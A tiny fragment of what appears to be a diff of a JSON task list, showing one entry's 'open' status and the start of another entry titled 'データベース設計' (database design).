+   "status": "open"
   },
   {
    "title": "データベース設計",
